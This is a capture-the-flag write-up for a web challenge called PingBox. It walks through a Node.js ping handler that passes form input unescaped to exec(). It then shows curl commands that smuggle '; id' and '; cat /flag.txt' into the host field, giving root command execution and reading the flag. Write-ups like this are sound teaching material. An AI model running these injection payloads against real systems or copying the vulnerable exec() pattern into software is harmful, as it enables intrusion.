# PingBox_MU (Security Impossible CTF 2026 - Monash University, web)

PingBox is a network diagnostics tool that allows system administrators to test network connectivity. The application exposes a single form that accepts an IP address or hostname and returns the output of the system `ping` command.

## Analyzing the Diagnostic Handler

Inspecting the network traffic generated by the web UI reveals that submitting the form sends an HTTP `POST` request to `/ping`:

```http
POST /ping HTTP/1.1
Host: target-web-05-pingbox:3000
Content-Type: application/x-www-form-urlencoded

host=127.0.0.1
```

The server response mirrors standard Linux utility output:
```text
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.041 ms
```

The backend implementation concatenates the user input directly into a shell execution string:

```javascript
const { exec } = require('child_process');
exec(`ping -c 2 ${req.body.host}`, (err, stdout, stderr) => {
    res.send(stdout || stderr);
});
```

Because the input is passed directly to `/bin/sh` without argument escaping or parameterized process creation (`execFile`), standard shell metacharacters such as `;`, `&&`, `|`, and `$()` can be injected to chain arbitrary commands.

## Achieving Command Execution

We test command injection using a semicolon delimiter:

```bash
curl -s http://$TARGET:3000/ping --data-urlencode 'host=127.0.0.1; id'
```

Output:
```text
uid=0(root) gid=0(root) groups=0(root)
```

The command executes successfully with full `root` privileges.

## Reading the Flag

We inject a command to read `/flag.txt`:

```bash
curl -s http://$TARGET:3000/ping --data-urlencode 'host=127.0.0.1; cat /flag.txt'
```

The response includes the ping statistics followed by the contents of `/flag.txt`.
